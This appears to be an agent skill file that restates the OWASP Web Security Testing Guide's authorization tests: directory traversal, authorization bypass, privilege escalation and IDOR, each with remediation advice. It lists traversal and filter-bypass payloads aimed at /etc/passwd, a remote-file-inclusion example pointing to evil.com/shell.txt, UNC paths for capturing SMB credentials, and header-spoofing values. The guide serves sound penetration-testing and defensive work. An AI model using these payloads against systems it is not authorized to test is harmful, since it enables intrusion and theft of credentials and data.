---
name: wstg-authorization
description: Use when testing authorization controls, directory traversal, authorization bypass, privilege escalation, insecure direct object references (IDOR), or access control enforcement during a penetration test or security assessment. Covers WSTG-ATHZ-01 through WSTG-ATHZ-04 from the OWASP Web Security Testing Guide v4.2.
risk: medium
source: owasp-wstg-v4.2
date_added: '2026-07-06'
---

## Purpose

Provide a structured methodology for testing authorization controls in web applications. Authorization flaws are among the most impactful vulnerabilities -- they allow attackers to access data, functions, and resources beyond their intended privileges without exploiting code injection or memory corruption. This skill covers the full OWASP WSTG v4.2 Authorization Testing suite.

## Quick Reference

| Test ID | Name | Objective |
|---------|------|-----------|
| WSTG-ATHZ-01 | Directory Traversal / File Include | Identify injection points that allow reading or writing files outside the web root |
| WSTG-ATHZ-02 | Bypassing Authorization Schema | Assess whether horizontal or vertical access control bypass is possible |
| WSTG-ATHZ-03 | Privilege Escalation | Verify that users cannot manipulate their privileges, roles, or identity |
| WSTG-ATHZ-04 | Insecure Direct Object References (IDOR) | Determine whether direct object references can be abused to access unauthorized resources |

---

## WSTG-ATHZ-01: Directory Traversal / File Include

### Objective

Identify injection points where user-supplied input is used in file-system operations (reading, writing, including files) and assess whether path traversal or file inclusion attacks can break out of the intended directory scope.

### Why This Matters

Path traversal and file inclusion are two of the oldest and most reliable ways to escalate from a web request to operating-system-level access. A single unfiltered parameter can leak source code, configuration files containing credentials, or let an attacker execute arbitrary code via remote file inclusion. Unlike many vulnerability classes, the impact is often immediate and severe -- reading `/etc/passwd` or `web.config` confirms the flaw in a single request.

### Input Vector Enumeration

Systematically enumerate every location where the application accepts user input that might influence file operations:

- **GET/POST parameters** -- look for names like `file`, `path`, `page`, `template`, `include`, `item`, `home`, `content`, `dir`, `folder`, `document`, `language`, `locale`, `theme`, `skin`, `style`
- **Cookie values** -- applications sometimes store template names, include paths, or language files in cookies
- **HTTP headers** -- custom headers may influence file resolution in frameworks
- **File uploads** -- filenames and paths provided via multipart uploads
- **REST/RPC paths** -- URL segments that map to filesystem resources
- **Database-stored values** -- parameters that appear internal but originate from user-controlled database records

### How to Test

**Stage 1: Detect file operations**

Send values that are unlikely to exist (e.g., `nonexistent12345.txt`) and compare error messages, response codes, and response timing against valid requests. Applications that perform file operations often leak different errors for "file not found" vs. "path not found" vs. "access denied" -- these differences reveal the underlying operation.

**Stage 2: Test traversal sequences**

Probe with traversal payloads targeting known files on each operating system:

| Platform | Target File | Why |
|----------|------------|-----|
| Linux/Unix | `/etc/passwd` | World-readable, confirms traversal |
| Linux/Unix | `/etc/hosts` | Smaller, less likely blocked |
| Windows | `windows/win.ini` | Present on all versions |
| Windows | `boot.ini` | Legacy; confirms depth |
| Any | Application source file | Proves code disclosure |

**Stage 3: Bypass input filters**

Developers frequently implement naive filters. Test each encoding variant:

- **URL encoding:** `%2e%2e%2f` for `../`, `%2e%2e%5c` for `..\`
- **Double URL encoding:** `%252e%252e%252f` for `../`
- **Unicode/UTF-8 overlong sequences:** `..%c0%af` for `../`, `..%c1%9c` for `..\`
- **Null byte injection:** `../../../etc/passwd%00.jpg` -- terminates string early in C-based backends
- **Path separator mixing:** Use forward slashes on Windows, backslashes on Unix
- **Absolute path bypass:** `/etc/passwd` directly if relative path filtering is the only check

**Stage 4: Test protocol and wrapper schemes**

If the application accepts full URLs or scheme prefixes, probe with wrappers that can bypass filesystem restrictions:

- `file:///etc/passwd` -- direct file protocol access
- `http://evil.com/shell.txt` -- remote file inclusion (RFI)
- `http://localhost:8080/admin` -- SSRF via include, accessing internal services
- `http://192.168.0.2:9080` -- lateral network probing

**Stage 5: Test self-referencing and path normalization quirks**

Some applications expose source code when a file references itself:

- Request the current script as the include target (e.g., `file=index.php` renders its own source)
- Test Windows shell path quirks: trailing dots (`file.txt...`), trailing spaces, trailing angle brackets, extraneous `./././` sequences, nonexistent parent references (`nonexistant/../file.txt`)
- Test Windows UNC paths: `\\server_or_ip\path\to\file.abc`, `\\?\server_or_ip\path\to\file.abc` -- can capture SMB credentials if the server connects back
- Test Windows NT device namespace: `\\.\GLOBALROOT\Device\HarddiskVolume1\`

**Stage 6: Source code review (gray-box)**

When source code is available, search for:

- PHP: `include()`, `include_once()`, `require()`, `require_once()`, `fopen()`, `readfile()`, `file_get_contents()`
- Java/JSP: `java.io.File()`, `java.io.FileReader()`, `FileInputStream`
- ASP/ASP.NET: `include file`, `include virtual`, `Server.Execute`, `System.IO.File`
- Regex pattern: `(include|require)(_once)?\s*['"(]?\s*\$_(GET|POST|COOKIE)`

Trace user-controllable data from entry points (request parameters, cookies, database values) to filesystem operations.

### What to Look For

- Response contains contents of `/etc/passwd`, `win.ini`, or any file outside the web root
- Source code of application files is disclosed (confirms arbitrary file read)
- Error messages change based on path validity (confirms path manipulation is processed)
- Remote content appears in the response (confirms RFI)
- Internal service responses appear (confirms SSRF via include)

### Remediation

- Use an allowlist of permitted files; never use user input directly in filesystem operations
- Map user-facing identifiers to internal file paths via an indirect reference map (e.g., `file_id=1` maps to `/safe/path/template.html`)
- Canonicalize paths before validation: resolve all `.` and `..` segments, then verify the result starts with the allowed base directory
- Apply the principle of least privilege: the web application process should only have read access to directories it genuinely needs
- Disable remote file inclusion in PHP (`allow_url_include = Off`, `allow_url_fopen = Off` unless required)
- Validate input against a strict pattern (e.g., alphanumeric only) where feasible

---

## WSTG-ATHZ-02: Bypassing Authorization Schema

### Objective

Assess whether the application properly enforces authorization boundaries between users of the same privilege level (horizontal) and between different privilege levels (vertical). Determine whether unauthenticated access, post-logout access, or cross-role access is possible.

### Why This Matters

Authorization bypass is the most common way attackers access data they should never see. Unlike authentication flaws (which are about proving identity), authorization flaws let an already-authenticated user act as someone else or access privileged functions. The business impact is direct: data theft, unauthorized transactions, and privilege escalation all stem from broken authorization checks.

### How to Test: Horizontal Bypass (Same Role, Different User)

Horizontal bypass occurs when User A can access User B's resources despite having the same privilege level.

**Methodology:**

1. Create or obtain two user accounts with identical roles/privileges
2. Establish two separate authenticated sessions (one per user)
3. For each function that returns user-specific data or performs user-specific operations, record the full request (URL, parameters, headers, body)
4. Swap the session token from User A's session into User B's request context (or swap resource identifiers like `user_id`, `account_id`, `order_id`)
5. Compare responses: if User A receives User B's private data or successfully operates on User B's resources, the application is vulnerable

**Key indicators:**
- Responses contain another user's PII, financial data, or private content
- Operations succeed on resources owned by the other user (e.g., modifying their settings, viewing their orders)
- The application relies solely on client-supplied identifiers without server-side ownership verification

### How to Test: Vertical Bypass (Lower Role to Higher Role)

Vertical bypass occurs when a user accesses functions or resources intended for a higher-privileged role (e.g., a regular user accessing admin functions).

**Methodology:**

1. Authenticate with a low-privileged account
2. Map all administrative or higher-privileged functionality (URL paths, API endpoints, function names)
3. Attempt to access each privileged endpoint using the low-privileged session token
4. Test both direct URL access and parameter manipulation
5. Verify whether the server enforces authorization at the function level or only hides UI elements

**Common scenarios:**

| Scenario | Test | Vulnerability Confirmed If |
|----------|------|---------------------------|
| Admin page access | Navigate directly to `/admin`, `/console`, `/manage` with a non-admin session | Admin pages render instead of redirecting or returning 403 |
| Admin function execution | Send requests to admin-only API endpoints (e.g., `POST /admin/addUser`) with a non-admin token | The function executes successfully |
| Resource access by role | Access files/objects restricted to a different role (e.g., HR documents as a non-HR user) | The resource is returned or modifiable |
| GUI-only protection | Identify endpoints via traffic analysis of admin sessions, then replay with lower-privileged tokens | Functions work despite being hidden in the UI |

### How to Test: Special Request Header Handling

Some applications and reverse proxies use non-standard headers to override the target URL. An attacker can exploit this to bypass front-end access controls.

**Headers to test:**
- `X-Original-URL` -- overrides the request path after proxy routing
- `X-Rewrite-URL` -- similar path override mechanism

**Detection methodology:**

1. Send a normal request to a known valid resource, observe the response
2. Send a request with `X-Original-URL: /nonexistent_test_12345` to the same valid resource
3. Send a request with `X-Rewrite-URL: /nonexistent_test_67890`
4. If either step returns a 404 or "not found" for the test path, the header is supported
5. Exploit: send a request to an "allowed" URL (e.g., `/`) with the header pointing to a restricted resource (e.g., `X-Original-URL: /admin`)

**Proxy/forwarding header abuse:**

Test whether internal-only endpoints can be reached by spoofing proxy headers:
- `X-Forwarded-For`, `X-Forward-For`, `X-Remote-IP`, `X-Originating-IP`, `X-Remote-Addr`, `X-Client-IP`
- Values: `127.0.0.1`, `localhost`, RFC1918 addresses (`10.x.x.x`, `172.16-31.x.x`, `192.168.x.x`), link-local addresses (`169.254.x.x`)
- Include port elements to evade filters: `127.0.0.4:80`, `127.0.0.4:443`

### What to Look For

- Low-privileged session accessing admin pages or executing admin functions
- Cross-user data leakage when swapping identifiers or session tokens
- Post-logout access to authenticated resources (session not properly invalidated)
- Unauthenticated access to resources that should require login
- Header-based path override succeeding on restricted endpoints

### Remediation

- Enforce authorization checks at the server on every request, not just at the UI level
- Use a centralized authorization module rather than per-endpoint checks
- Apply the principle of least privilege to all roles
- Deny by default; only permit access through explicit grants
- Invalidate sessions fully on logout (server-side session termination, not just cookie removal)
- Verify resource ownership server-side for every user-specific operation (do not trust client-supplied identifiers alone)
- Reject or sanitize non-standard proxy headers (`X-Original-URL`, `X-Rewrite-URL`) unless explicitly required by architecture; if required, validate the header value against the same authorization rules as the request URL

---

## WSTG-ATHZ-03: Privilege Escalation

### Objective

Identify points where a user can manipulate parameters, session data, or request flow to gain privileges beyond their assigned role. Confirm that the application does not implicitly trust client-supplied privilege indicators.

### Why This Matters

Privilege escalation is the ultimate authorization failure -- it turns a limited user into an administrator. While WSTG-ATHZ-02 focuses on bypassing the schema, WSTG-ATHZ-03 focuses on the mechanics of how the privilege change happens. The distinction is important: bypass might grant access to one admin function; escalation changes the user's identity or role permanently, enabling sustained abuse. A single privilege escalation bug can compromise the entire application.

### How to Test

**Manipulation of user group/role parameters:**

Inspect every request where group membership or role assignment is transmitted:
- Look for parameters: `groupID`, `role`, `roleID`, `group`, `permission`, `accessLevel`, `type`, `isAdmin`, `admin`
- Attempt to change the value to a higher-privileged group or role
- Verify the server enforces the user's actual group membership rather than trusting the client-supplied value

**Manipulation of user profile fields:**

Examine responses after authentication for hidden form fields, cookies, or JSON data that encode privilege information:
- Hidden inputs: `<input type="hidden" name="profile" value="User">`
- Cookie values: `role=user`
- JWT payloads or session objects containing role claims
- Modify these values to reflect a higher-privileged profile (e.g., `User` to `SysAdmin`) and verify whether the server accepts the change

**Manipulation of condition/status values:**

Some applications encode authorization decisions in client-visible status codes or flags:
- Look for numeric flags that indicate success/failure or privilege level
- Example: `PVValid` values where `-1` means "error" and `0` means "validated as admin"
- Attempt to flip status values to bypass authorization gates

**Manipulation of IP address checks:**

When the application uses IP-based access control or rate limiting:
- Test whether IP-derived headers can be spoofed: `X-Forwarded-For`, `X-Real-IP`, `Client-IP`
- Attempt to bypass IP-based restrictions by inserting allowed IP addresses (localhost, internal ranges)

**URL traversal for unauthenticated endpoints:**

Some pages lack authorization checks entirely due to developer oversight:
- Traverse the application structure systematically, testing each discovered path with and without authentication
- Pay special attention to backup files, debug endpoints, API documentation paths, and versioned endpoints (e.g., `/v1/admin`, `/v2/admin`)
- Test path normalization bypasses where partial URL matching is used for authorization (e.g., `startswith("/user")` can be bypassed with `/user/../admin/deleteUser`)

**Weak session ID prediction:**

When session identifiers follow a predictable pattern:
- Analyze session token structure (encoding, entropy, apparent components like `MD5(Password + UserID)`)
- Attempt to compute or predict valid session IDs for other users, especially administrative accounts
- Test whether predictable tokens grant access to privileged sessions

### What to Look For

- Server accepts modified role/group/profile values without re-validating against the authenticated user's actual privileges
- Client-supplied status flags override server-side authorization decisions
- IP-based controls are bypassed via header injection
- Hidden endpoints are accessible without any authorization check
- Session tokens are predictable and can be computed for other users

### Remediation

- Store user roles and privileges server-side (in the session or database); never accept privilege indicators from the client
- Perform authorization checks on every request at the server, independently of any client-supplied data
- Bind the session to the user's identity and role after authentication; re-validate on every sensitive operation
- Use cryptographically secure random session identifiers with sufficient entropy
- Implement server-side rate limiting and IP tracking that does not rely on client-supplied headers
- Avoid URL-based authorization matching (prefix/suffix checks); use exact path matching or a centralized route authorization table

---

## WSTG-ATHZ-04: Insecure Direct Object References (IDOR)

### Objective

Identify all locations where user-supplied input references internal objects (database records, files, functions) directly, and assess whether access control is enforced before the object is returned or modified.

### Why This Matters

IDOR is consistently one of the most common and most impactful authorization flaws. It is the direct manifestation of "the application trusts user input to decide what to access." Unlike SQL injection (which requires technical exploitation), IDOR often requires nothing more than changing a number in a URL. The simplicity of exploitation combined with the potential for mass data exfiltration makes IDOR a critical category to test thoroughly.

### How to Test

**Prerequisite:** Always test with at least two user accounts that own different objects. This eliminates guesswork -- you know exactly which object belongs to the other user and can confirm unauthorized access definitively.

**Scenario 1: Direct database record reference**

When a parameter value maps directly to a database row:
- Identify parameters that appear to be sequential identifiers: `invoice=12345`, `user=42`, `order=8891`, `document=1002`
- Obtain the identifier of a record belonging to User B while authenticated as User A
- Request User B's record using User A's session
- If the application returns User B's data, it is vulnerable

**Scenario 2: Direct operation reference**

When a parameter selects the target of a sensitive operation:
- Look for operations like password changes, email updates, or account modifications where the target user is specified as a parameter: `user=someuser`, `accountId=123`
- Attempt to perform the operation on another user's account
- Pay special attention to multi-step operations where authorization is checked in step 1 but not in subsequent steps

**Scenario 3: Direct file system resource reference**

When a parameter retrieves files directly:
- Identify parameters used for file retrieval: `img=`, `file=`, `document=`, `attachment=`, `download=`
- Determine whether identifiers are predictable (sequential numbers, timestamps, hashed usernames)
- Attempt to access files belonging to other users by modifying the identifier
- Combine with path traversal testing: an IDOR on file parameters combined with traversal can expose the entire filesystem

**Scenario 4: Direct application functionality reference**

When a parameter selects which function or page to render:
- Identify parameters that reference menu items, page IDs, or function codes: `menuitem=12`, `page=profile`, `action=delete`
- Map which values are accessible to the current user's role
- Attempt values outside the allowed set to access restricted functionality
- This pattern is common in applications that use a single dispatcher endpoint with a function parameter

**Scenario 5: Split object references**

When object identification spans multiple parameters:
- Look for patterns where the combination of parameters identifies an object: `userId=5&docId=12`, `group=finance&file=report1`
- Test each parameter independently and in combination
- Verify that authorization checks consider the complete object context, not just one parameter

### What to Look For

- User A receives User B's private data by changing a sequential identifier
- User A successfully modifies User B's account settings or data
- User A accesses files or documents belonging to User B
- User A reaches restricted application pages by changing a function/menu parameter
- Responses are identical regardless of which user's session is used (confirms no ownership check)

### Remediation

- Replace direct object references with indirect reference maps: the client receives a random, per-session token that the server maps to the actual object
- Verify object ownership on every request: check that the authenticated user is authorized to access the specific object before returning or modifying it
- Use unpredictable identifiers (UUIDs) instead of sequential integers where feasible -- this raises the difficulty of enumeration but is not a substitute for authorization checks
- Implement access control checks at the data layer (row-level security in the database) as a defense-in-depth measure
- Never rely on object ID obscurity alone; always enforce server-side authorization

---

## Common Vulnerability Patterns Across All Authorization Tests

### Developer Anti-Patterns That Cause Authorization Flaws

- **Client-side enforcement only:** Hiding UI elements without server-side checks. The API still accepts the request.
- **Parameter-based authorization:** Reading the user's role from a cookie, hidden field, or request parameter instead of the session.
- **Partial URL matching:** Using `startsWith("/user")` for authorization checks, bypassed with `/user/../admin`.
- **Order-dependent checks:** Verifying authorization in step 1 of a wizard but not in subsequent steps.
- **GET vs. POST inconsistency:** Protecting POST endpoints but not the equivalent GET parameters.
- **Object-level checks only at listing time:** Checking ownership when listing objects but not when accessing individual objects.
- **Trusted source assumption:** Believing that a value coming from a database or internal service is safe without re-validating ownership.

### Misconfiguration Patterns

- Directory listing enabled on the web server, exposing file structure for traversal attacks
- Default admin paths left accessible (`/admin`, `/console`, `/manager`, `/phpmyadmin`)
- Debug/development endpoints deployed to production without authentication
- API versioning leaving old, unmaintained endpoints with weaker authorization
- Reverse proxy rules that strip authorization headers or pass through internal-only paths
- Cloud storage (S3 buckets, blob storage) with permissive access policies

### Bug-Finding Efficiency Tips

1. **Map first, test second.** Spend time enumerating all endpoints and parameters before attempting bypass. A complete map prevents missing hidden functionality.
2. **Use two browsers or two profiles simultaneously** to maintain parallel sessions and compare responses side-by-side.
3. **Automate parameter swapping.** For every request that contains a resource identifier, replay it with the alternate user's token and identifiers. Manual testing misses patterns.
4. **Test the highest-privilege functions first** (delete, modify, view-all). Authorization failures here have the most impact and are often the most clearly detectable.
5. **Look for identical responses.** If User A and User B receive byte-for-byte identical responses when requesting "their own" data with swapped identifiers, the application has no per-user authorization.
6. **Check error handling differences.** Applications that crash or return different errors for "not found" vs. "access denied" leak information about object existence (user enumeration via IDOR).
7. **Test post-authentication flows.** After login, immediately after logout, after password change, after session timeout -- each transition is an opportunity for authorization state to be mishandled.
8. **Don't stop at the first bypass.** If you find one IDOR or one privilege escalation, there are almost certainly more. Authorization flaws cluster because they stem from systemic architecture decisions, not isolated mistakes.

### Testing Order / Priority

1. WSTG-ATHZ-02 (Bypassing Authorization Schema) -- provides the broadest coverage first
2. WSTG-ATHZ-04 (IDOR) -- highest probability of finding exploitable issues
3. WSTG-ATHZ-01 (Directory Traversal) -- tests for the most severe impact (OS-level access)
4. WSTG-ATHZ-03 (Privilege Escalation) -- deeper testing of role manipulation after understanding the authorization model

---

## References

- OWASP Web Security Testing Guide v4.2, Section 4.5: Authorization Testing (WSTG-ATHZ-01 through WSTG-ATHZ-04)
- OWASP Application Security Verification Standard (ASVS) v4.0.1: Sections V4.0.1-1, V4.0.1-4, V4.0.1-9, V4.0.1-16 (Access Control)
- OWASP Top 10 2013: A4 - Insecure Direct Object References
- OWASP Top 10 2021: A01 - Broken Access Control
- NIST SP 800-53: AC (Access Control) family
